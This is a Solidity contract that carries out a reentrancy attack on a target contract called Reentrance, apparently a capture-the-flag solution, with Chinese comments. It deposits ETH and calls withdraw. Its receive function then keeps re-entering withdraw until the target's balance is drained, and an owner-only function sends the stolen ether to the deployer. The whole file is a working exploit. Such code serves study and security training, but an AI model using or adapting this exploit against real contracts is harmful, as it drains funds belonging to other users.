  // SPDX-License-Identifier: MIT
  pragma solidity 0.6.12;

  import { Reentrance } from "./Reentrance.sol";

  contract AttackReentrance {
      Reentrance public reentrance;
      uint256 public initialDeposit;  // ✓ 记录初始存款
      address public owner;

      constructor(address payable _reentrance) public {
          reentrance = Reentrance(_reentrance);
          owner = msg.sender;
      }

      function attack() public payable {
          require(msg.value > 0, "Send ETH to attack");
          initialDeposit = msg.value;  // ✓ 保存
          reentrance.donate{value: msg.value}(address(this));
          reentrance.withdraw(msg.value);
      }

      receive() external payable {
          uint256 targetBalance = address(reentrance).balance;

          if (targetBalance > 0) {
              // ✓ 每次提取固定金额（初始存款）或剩余金额（取较小值）
              uint256 withdrawAmount = initialDeposit;
              if (targetBalance < initialDeposit) {
                  withdrawAmount = targetBalance;  // 最后一次提取剩余
              }
              reentrance.withdraw(withdrawAmount);
          }
      }

      // ✓ 添加提取函数
      function withdraw() external {
          require(msg.sender == owner, "Only owner");
          payable(owner).transfer(address(this).balance);
      }

      // ✓ 查询余额
      function getBalance() external view returns (uint256) {
          return address(this).balance;
      }
  }